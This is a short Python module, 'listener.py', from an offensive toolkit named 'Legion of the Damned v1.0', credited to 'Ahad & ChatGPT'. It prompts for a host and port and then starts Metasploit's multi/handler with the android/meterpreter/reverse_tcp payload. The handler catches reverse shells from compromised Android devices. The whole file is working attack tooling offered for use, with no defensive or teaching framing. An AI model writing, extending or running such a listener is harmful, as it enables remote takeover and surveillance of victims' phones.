# listener.py
# Legion of the Damned v1.0 - Listener Module
# Author: Ahad & ChatGPT

import os
import time

def start_listener(lhost, lport):
    print(f"[+] Starting listener on {lhost}:{lport}...")
    time.sleep(1)
    command = f"msfconsole -q -x 'use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST {lhost}; set LPORT {lport}; exploit'"
    os.system(command)

def listener():
    print("\\n--- Listener Setup ---")
    lhost = input("Enter LHOST (Your IP or Tunnel URL): ")
    lport = input("Enter LPORT (Your Port): ")

    start_listener(lhost, lport)
    time.sleep(2)
